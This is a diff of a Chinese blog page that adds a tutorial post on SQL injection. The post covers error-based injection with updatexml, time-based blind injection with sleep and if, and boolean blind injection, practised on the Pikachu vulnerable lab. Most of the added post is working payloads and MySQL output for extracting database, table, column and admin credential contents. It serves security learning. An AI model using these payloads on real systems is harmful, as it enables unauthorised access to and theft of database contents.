@@ -443,12 +443,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                web安全
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -466,14 +479,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    1.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    7 分
                 </div>
                 
 
@@ -493,7 +506,194 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="WEB漏洞-查询方式及报错盲注"><a href="#WEB漏洞-查询方式及报错盲注" class="headerlink" title="WEB漏洞-查询方式及报错盲注"></a><font size="6"><strong>WEB漏洞-查询方式及报错盲注</strong></font></h2><span id="more"></span>
+
+<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a><font size="5"><strong>一、前言</strong></font></h3><p>前言：当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句。</p>
+<h3 id="二、设计知识点"><a href="#二、设计知识点" class="headerlink" title="二、设计知识点"></a><font size="5"><strong>二、设计知识点</strong></font></h3><p>#补充:上课的Access暴力猜解不出的问题?</p>
+<pre class=" language-bash"><code class="language-bash">Access扁移注入:解决列名获取不到的情况
+查看登陆框源代码的表单值或观察URL特征等也可以针对表或列获取不到的情况
+</code></pre>
+<p>参考笔记：<a target="_blank" rel="noopener" href="https://www.fujieace.com/penetration-test/access-offset-injection.html">https://www.fujieace.com/penetration-test/access-offset-injection.html</a></p>
+<h4 id="1、SQL语句网站应用"><a href="#1、SQL语句网站应用" class="headerlink" title="1、SQL语句网站应用"></a><font size="4"><strong>1、SQL语句网站应用</strong></font></h4><pre class=" language-bash"><code class="language-bash">select查询数据
+在网站应用中进行数据显示查询操作
+例: <span class="token keyword">select</span> * from news where id<span class="token operator">=</span><span class="token variable">$id</span>
+
+insert插入数据
+在网站应用中进行用户注册添加等操作
+例: insert into news <span class="token punctuation">(</span>id, url,text<span class="token punctuation">)</span> values <span class="token punctuation">(</span> 2，<span class="token string">'x'</span>,<span class="token string">'<span class="token variable">$t</span>'</span><span class="token punctuation">)</span>
+
+delete删除数据
+后台管理里面删除文章删除用户等操作
+例: delete from news where id<span class="token operator">=</span><span class="token variable">$id</span>
+
+update更新数据
+会员或后台中心数据同步或缓存等操作
+例: update user <span class="token keyword">set</span> pwd<span class="token operator">=</span><span class="token string">'<span class="token variable">$p</span>'</span> where id<span class="token operator">=</span>2 and username<span class="token operator">=</span><span class="token string">' admin'</span>
+
+order by排序数据
+一般结合表名或列名进行数据排序操作
+例: <span class="token keyword">select</span> * from news order by <span class="token variable">$id</span>
+例: <span class="token keyword">select</span> <span class="token function">id</span> , name , price from news order by <span class="token variable">$order</span>
+</code></pre>
+<h3 id="三、SQL语句盲注"><a href="#三、SQL语句盲注" class="headerlink" title="三、SQL语句盲注"></a><font size="5"><strong>三、SQL语句盲注</strong></font></h3><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类:</p>
+<pre class=" language-bash"><code class="language-bash">1、基于布尔的sQL盲注-逻辑判断 regexp, like , ascii,left, ord , mid
+2、基于时间的sQL盲注-延时判断 <span class="token keyword">if</span> ,sleep
+3、基于报错的sQL盲注-报错回显 floor, updatexml, extractvalue 
+</code></pre>
+<p>参考地址：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a>     	<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/692723">https://developer.aliyun.com/article/692723</a></p>
+<p>首先了解下updatexml()函数1<br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值<br>而我们的注入语句为：</p>
+<pre class=" language-bash"><code class="language-bash">updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>SELECT @@version<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>
+</code></pre>
+<p>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出</p>
+<pre class=" language-bash"><code class="language-bash">ERROR 1105 <span class="token punctuation">(</span>HY000<span class="token punctuation">)</span>: XPATH syntax error: <span class="token string">':root@localhost'</span>
+</code></pre>
+<p>使用pikachu靶场进行测试，使用docker搭建pikachu靶场<br>docker run -d -p 8000:80 area39&#x2F;pikachu:latest</p>
+<h4 id="1、insert语句"><a href="#1、insert语句" class="headerlink" title="1、insert语句"></a><font size="4"><strong>1、insert语句</strong></font></h4><p><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/1.png"></p>
+<p>用burp抓取数据包、并修改数据包</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token string">'or updatexml(1,concat(0x7e,database(),0x7e),0) or'</span>
+
+username<span class="token operator">=</span>xiaodi<span class="token string">'or updatexml(1,concat(0x7e,version(),0x7e),0) or'</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>123456<span class="token operator">&amp;</span>sex<span class="token operator">=</span>man<span class="token operator">&amp;</span>phonenum<span class="token operator">=</span>138<span class="token operator">&amp;</span>email<span class="token operator">=</span>%E5%9B%9B%E5%B7%9D<span class="token operator">&amp;</span>add<span class="token operator">=</span>%E6%88%90%E9%83%BD<span class="token operator">&amp;</span>submit<span class="token operator">=</span>submit
+</code></pre>
+<p>注意：将注意语句放在语句的其他位置是可以的注意看网站提交的数据。<br><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/2.png"><br><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/3.png"><br><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/4.png"><br><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/5.png"></p>
+<h4 id="2、update语句"><a href="#2、update语句" class="headerlink" title="2、update语句"></a><font size="4"><strong>2、update语句</strong></font></h4><p><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/6.png"><br>发送到repeter模块当中,修改数据包</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token string">'or updatexml(1,concat(0x7e,database(),0x7e),0) or'</span>
+</code></pre>
+<p><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/7.png"><br>原理基本一致</p>
+<h4 id="3、delete语句"><a href="#3、delete语句" class="headerlink" title="3、delete语句"></a><font size="4"><strong>3、delete语句</strong></font></h4><pre class=" language-bash"><code class="language-bash">payload: 68 or updatexml <span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,datebase<span class="token punctuation">(</span><span class="token punctuation">))</span>,0<span class="token punctuation">)</span>
+且在BurpSuite中Ctrl+U 对payload进行url编码
+</code></pre>
+<p><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/8.png"></p>
+<h3 id="四、SQL时间盲注"><a href="#四、SQL时间盲注" class="headerlink" title="四、SQL时间盲注"></a><font size="5"><strong>四、SQL时间盲注</strong></font></h3><h4 id="1、sleep语句"><a href="#1、sleep语句" class="headerlink" title="1、sleep语句"></a><font size="4"><strong>1、sleep语句</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from member where id<span class="token operator">=</span>1<span class="token punctuation">;</span>
++----+----------+----------------------------------+-------+----------+---------+--------+
+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> pw                               <span class="token operator">|</span> sex   <span class="token operator">|</span> phonenum <span class="token operator">|</span> address <span class="token operator">|</span> email  <span class="token operator">|</span>
++----+----------+----------------------------------+-------+----------+---------+--------+
+<span class="token operator">|</span>  1 <span class="token operator">|</span> vince    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> admin <span class="token operator">|</span> asdasd   <span class="token operator">|</span> 四川    <span class="token operator">|</span> 成都   <span class="token operator">|</span>
++----+----------+----------------------------------+-------+----------+---------+--------+
+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+mysql<span class="token operator">></span>
+mysql<span class="token operator">></span> <span class="token keyword">select</span> * from member where id<span class="token operator">=</span>1 and sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+Empty <span class="token keyword">set</span> <span class="token punctuation">(</span>5.00 sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span>
+</code></pre>
+<h4 id="2、if语句"><a href="#2、if语句" class="headerlink" title="2、if语句"></a><font size="4"><strong>2、if语句</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'pikachu'</span>,123,456<span class="token punctuation">)</span><span class="token punctuation">;</span>
++----------------------------------+
+<span class="token operator">|</span> if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'pikachu'</span>,123,456<span class="token punctuation">)</span> <span class="token operator">|</span>
++----------------------------------+
+<span class="token operator">|</span>                              123 <span class="token operator">|</span>
++----------------------------------+
+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'test'</span>,123,456<span class="token punctuation">)</span><span class="token punctuation">;</span>
++-------------------------------+
+<span class="token operator">|</span> if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'test'</span>,123,456<span class="token punctuation">)</span> <span class="token operator">|</span>
++-------------------------------+
+<span class="token operator">|</span>                           456 <span class="token operator">|</span>
++-------------------------------+
+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span>
+</code></pre>
+<h4 id="3、if-sleep语句"><a href="#3、if-sleep语句" class="headerlink" title="3、if+sleep语句"></a><font size="4"><strong>3、if+sleep语句</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from member where id<span class="token operator">=</span>1 and sleep<span class="token punctuation">(</span>if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'pikachu'</span>,5,0<span class="token punctuation">))</span><span class="token punctuation">;</span>
+Empty <span class="token keyword">set</span> <span class="token punctuation">(</span>5.00 sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span>
+</code></pre>
+<p>语句的意思就是如果数据是pikachu就延迟5秒输出，不是的话就立即返回，但是在实际渗透过程中由于受到网络的影响时间注入不是很靠谱</p>
+<pre class=" language-bash"><code class="language-bash">参考:
+like <span class="token string">'ros'</span>									<span class="token comment" spellcheck="true">#判断ro或ro...是否成立</span>
+regexp <span class="token string">'^xiaodi [a-z]'</span>			<span class="token comment" spellcheck="true">#匹配xiaodi及xiaodi...等if(条件,5,0)</span>
+<span class="token function">sleep</span> <span class="token punctuation">(</span>5<span class="token punctuation">)</span>										<span class="token comment" spellcheck="true">#sQL语句延时执行s秒</span>
+mid <span class="token punctuation">(</span>a, b, c<span class="token punctuation">)</span>								<span class="token comment" spellcheck="true">#从位置b开始，截取a字符串的c位</span>
+substr<span class="token punctuation">(</span> a,b, c<span class="token punctuation">)</span>							<span class="token comment" spellcheck="true">#从b位置开始，截取字符串a的c长度</span>
+left <span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span>, database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#left(a,b)从左侧截取a的前b位</span>
+length<span class="token punctuation">(</span>database <span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token operator">=</span>8				<span class="token comment" spellcheck="true">#判断数据库database ()名的长度</span>
+ord<span class="token operator">=</span>ascii ascii<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">=</span>97 			<span class="token comment" spellcheck="true">#判断x的ascii码是否等于97</span>
+</code></pre>
+<h4 id="4、if-mid-sleep"><a href="#4、if-mid-sleep" class="headerlink" title="4、if+mid+sleep"></a><font size="4"><strong>4、if+mid+sleep</strong></font></h4><p>判断数据库名称是不是以p开头如果是的话就延迟五秒输出。</p>
+<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
++------------+
+<span class="token operator">|</span> database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span>
++------------+
+<span class="token operator">|</span> pikachu    <span class="token operator">|</span>
++------------+
+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
+mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where id<span class="token operator">=</span>1 and sleep<span class="token punctuation">(</span>if<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'p'</span>,5,0<span class="token punctuation">))</span><span class="token punctuation">;</span>
+Empty <span class="token keyword">set</span> <span class="token punctuation">(</span>5.00 sec<span class="token punctuation">)</span>
+</code></pre>
+<h3 id="五、布尔盲注"><a href="#五、布尔盲注" class="headerlink" title="五、布尔盲注"></a><font size="5"><strong>五、布尔盲注</strong></font></h3><pre class=" language-bash"><code class="language-bash">布尔（Boolean）型是计算机里的一种数据类型，只有True（真）和False（假）两个值。一般也称为逻辑型。
+ 页面在执行sql语句后，只显示两种结果，这时可通过构造逻辑表达式的sql语句来判断数据的具体内容。
+12
+</code></pre>
+<p>布尔注入用到的函数：</p>
+<pre class=" language-bash"><code class="language-bash">mid<span class="token punctuation">(</span>str,start,length<span class="token punctuation">)</span>  :字符串截取
+ORD<span class="token punctuation">(</span><span class="token punctuation">)</span>                  :转换成ascii码
+Length<span class="token punctuation">(</span><span class="token punctuation">)</span>               :统计长度
+version<span class="token punctuation">(</span><span class="token punctuation">)</span>              :查看数据库版本
+database<span class="token punctuation">(</span><span class="token punctuation">)</span>             :查看当前数据库名
+user<span class="token punctuation">(</span><span class="token punctuation">)</span>                 :查看当前用户
+123456
+</code></pre>
+<h4 id="布尔注入流程："><a href="#布尔注入流程：" class="headerlink" title="布尔注入流程："></a><font size="4"><strong>布尔注入流程：</strong></font></h4><p><strong>猜解获取数据库长度</strong></p>
+<pre class=" language-bash"><code class="language-bash">' or length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span> <span class="token operator">></span> 8 --+    :符合条件返回正确，反之返回错误
+1
+</code></pre>
+<p><strong>猜解数据库名</strong></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token string">'or mid(database(),1,1)= '</span>z<span class="token string">' --+    :因为需要验证的字符太多，所以转化为ascii码验证
+'</span>or ORD<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span> <span class="token operator">></span> 100 --+ :通过确定ascii码，从而确定**数据库名**
+12
+</code></pre>
+<p><strong>猜解表的总数</strong></p>
+<pre class=" language-bash"><code class="language-bash">'or <span class="token punctuation">(</span>select count<span class="token punctuation">(</span>TABLE_NAME<span class="token punctuation">)</span> from information_schema.TABLES where TABLE_SCHEMA<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span> <span class="token operator">=</span> 2  --+   :判断表的总数
+1
+</code></pre>
+<p><strong>猜解第一个表名的长度</strong></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token string">'or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+
+'</span>or <span class="token punctuation">(</span>select length<span class="token punctuation">(</span>TABLE_NAME<span class="token punctuation">)</span> from information_schema.TABLES where TABLE_SCHEMA<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 1,1<span class="token punctuation">)</span> <span class="token operator">=</span> 5 --+ （第二个表）
+12
+</code></pre>
+<p><strong>猜解第一个表名</strong></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token string">'or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit      0,1 ),1,1) = '</span>a<span class="token string">'  --+
+或者
+'</span>Or ORD<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>select TABLE_NAME from information_schema.TABLES where 
+TABLE_SCHEMA <span class="token operator">=</span> database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span> <span class="token operator">></span>100   --+
+1234
+</code></pre>
+<p><strong>猜解表的字段的总数</strong></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token string">'or (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='</span>表名'<span class="token punctuation">)</span> <span class="token operator">></span> 5 --+
+1
+</code></pre>
+<p><strong>猜解第一个字段的长度</strong></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token string">'or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='</span>表名<span class="token string">' limit 0,1) = 10 --+
+'</span>or <span class="token punctuation">(</span>select length<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.COLUMNS where TABLE_NAME<span class="token operator">=</span><span class="token string">'表名'</span> limit 1,1<span class="token punctuation">)</span> <span class="token operator">=</span> 10 --+ （第二个字段）
+12
+</code></pre>
+<p><strong>猜解第一个字段名</strong></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token string">'or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = '</span>表名<span class="token string">' limit 0,1),1,1) = '</span>i<span class="token string">' --+
+或者
+'</span>or ORD<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME <span class="token operator">=</span> <span class="token string">'表名'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span> <span class="token operator">></span> 100 --+
+123
+</code></pre>
+<p><strong>猜解直接猜测字段名</strong></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token string">' or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='</span>表名<span class="token string">' limit 1,1) = '</span>username' --+
+1
+</code></pre>
+<p><strong>猜解内容长度</strong></p>
+<pre class=" language-bash"><code class="language-bash">假如已经知道字段名为  <span class="token function">id</span>   username password
+'or <span class="token punctuation">(</span>select Length<span class="token punctuation">(</span>concat<span class="token punctuation">(</span>username,<span class="token string">"---"</span>,password<span class="token punctuation">))</span> from admin limit 0,1<span class="token punctuation">)</span> <span class="token operator">=</span> 16  --+
+12
+</code></pre>
+<p><strong>猜解内容</strong></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token string">'or mid((select concat(username,"-----",password) from admin limit 0,1),1,1) = '</span>a<span class="token string">' --+
+或者
+'</span>or ORD<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select concat<span class="token punctuation">(</span>username,<span class="token string">"-----"</span>,password<span class="token punctuation">)</span> from admin limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span> <span class="token operator">></span> 100 --+    ASCII码猜解
+123
+</code></pre>
+<p><strong>也可以直接猜测内容</strong></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token string">'or (Select concat(username,"-----",password) from admin limit 0,1 ) = '</span>admin-----123456'   --+
+1
+</code></pre>
+
                 
             </div>
             <hr/>
@@ -556,7 +756,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -741,7 +945,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            WEB漏洞-查询方式及报错盲注
                         
                     </div>
                     <div class="publish-info">
@@ -750,13 +954,25 @@
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            爱睡懒觉的道士
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -1042,7 +1258,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">23.7k</span>&nbsp;字
+                class="white-color">25.5k</span>&nbsp;字
             
             
             
